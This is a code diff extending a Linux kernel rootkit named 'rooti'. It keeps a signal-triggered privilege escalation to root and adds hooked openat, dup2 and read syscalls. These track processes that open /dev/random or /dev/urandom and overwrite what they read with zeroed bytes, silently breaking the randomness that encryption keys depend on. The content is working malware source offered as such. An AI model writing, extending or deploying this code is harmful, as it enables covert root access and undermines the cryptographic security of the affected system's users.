@@ -1,7 +1,10 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/types.h>
+#include <linux/string.h>
 #include <linux/cred.h>
+#include <linux/uaccess.h>
 #include "hooking.c"
 
 MODULE_LICENSE("GPL");
@@ -12,7 +15,23 @@ MODULE_VERSION("1.0.0");
 // Unused signal number, used to request a privilege escalation to root
 #define ROOTI_SIG_PE 64
 
+/*
+    This struct stores some file descriptor that is of interest to us which was opened
+    by some usermode process. This struct would be initialized in a hook for some open-like syscall
+    and read in a hook for some read-like or write-like syscall whenever we want to tamper with file I/O.
+*/
+struct rooti_tamper_fd {
+    int fd;     // file descriptor number
+    pid_t pid;  // PID of the owner
+};
+
+// TODO: implement a linked-list of tempered FDs instead of this
+struct rooti_tamper_fd _rand_tamper_fd;
+
 static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
+static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
+static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
+static asmlinkage long (*orig_read)(const struct pt_regs *regs);
 
 static int elevate_privilege(void)
 {
@@ -44,9 +63,78 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
     return orig_kill(regs);
 }
 
+static asmlinkage long hook_openat(const struct pt_regs *regs)
+{
+    char *filepath_user = (char *)regs->si;
+    char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
+    if (filepath_kernel == NULL) {
+        printk(KERN_DEBUG "rooti: failed to allocate memory");
+        return orig_openat(regs);
+    }
+
+    int err = copy_from_user(filepath_kernel, filepath_user, NAME_MAX);
+    if (err > 0) {
+        printk(KERN_DEBUG "rooti: copy_from_user() failed");
+        kfree(filepath_kernel);
+        return orig_openat(regs);
+    }
+    
+    if (strncmp(filepath_kernel, "/dev/random", NAME_MAX) == 0 || strncmp(filepath_kernel, "/dev/urandom", NAME_MAX) == 0) {
+        pid_t pid = current->pid;
+        int fd = orig_openat(regs);
+        _rand_tamper_fd.fd = fd;
+        _rand_tamper_fd.pid = pid;
+        kfree(filepath_kernel);
+        return fd;
+    }
+
+    kfree(filepath_kernel);
+    return orig_openat(regs);
+}
+
+static asmlinkage long hook_dup2(const struct pt_regs *regs) {
+    pid_t pid = current->pid;
+    int oldfd = regs->di;
+    int newfd = orig_dup2(regs);
+    if (pid == _rand_tamper_fd.pid && oldfd == _rand_tamper_fd.fd) {
+        _rand_tamper_fd.fd = newfd;
+    }
+    return newfd;
+}
+
+static asmlinkage long hook_read(const struct pt_regs *regs) {
+    pid_t pid = current->pid;
+    int fd = regs->di;
+    char *user_buf = (char *)regs->si;
+    size_t count = regs->dx;
+
+    size_t nread = nread = orig_read(regs);;
+    if (_rand_tamper_fd.pid != pid || _rand_tamper_fd.fd !=fd) {
+        return nread;
+    }
+    char *kernel_buf = kzalloc(count, GFP_KERNEL);
+    if (kernel_buf == NULL) {
+        printk(KERN_DEBUG "rooti: failed to allocate memory");
+        return nread;
+    }
+
+    int err = copy_to_user(user_buf, kernel_buf, count);
+    if (err > 0) {
+        printk(KERN_DEBUG "rooti: copy_to_user() failed");
+        kfree(kernel_buf);
+        return nread;
+    }
+
+    kfree(kernel_buf);
+    return nread;
+}
+
 // List of system calls to hook :D
 struct rooti_syscall_hook hooks[] = {
-    ROOTI_HOOK("sys_kill", hook_kill, &orig_kill)
+    ROOTI_HOOK("sys_kill", hook_kill, &orig_kill),
+    ROOTI_HOOK("sys_openat", hook_openat, &orig_openat),
+    ROOTI_HOOK("sys_dup2", hook_dup2, &orig_dup2),
+    ROOTI_HOOK("sys_read", hook_read, &orig_read),
 };
 
 
